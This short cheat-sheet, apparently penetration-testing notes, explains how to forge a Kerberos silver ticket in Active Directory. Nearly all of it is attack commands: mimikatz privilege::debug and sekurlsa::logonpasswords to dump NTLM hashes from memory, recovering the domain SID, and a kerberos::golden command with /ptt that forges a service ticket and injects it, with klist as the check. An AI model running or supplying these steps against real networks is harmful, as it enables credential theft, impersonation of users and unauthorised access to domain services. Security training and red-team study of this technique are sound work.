## Silver Tickets
To create a silver ticket, requirement:
1. SPN Password Hash (Requires local administrator)
2. Domain SID
3. Target SPN
```
To obtain SPN Password Hash
Launch powershell as administrator and run mimikatz

privilege::debug
sekurlsa::logonpasswords
extract ntlm hash
-----------------------------------------------------------
To obtain Domain SID
whoami /user and omit the digits after the last -
-----------------------------------------------------------
For target SPN, the format is [service]/name@domainname:port
-----------------------------------------------------------
Full Format to create the forged ticket
kerberos::golden /sid:DomainSID /domain:domainname /ptt /target:name@domainname /service:service /rc4:ntlmhash /user:username


------------------------------------------------------------
To check if the ticket submitted successfully
klist
```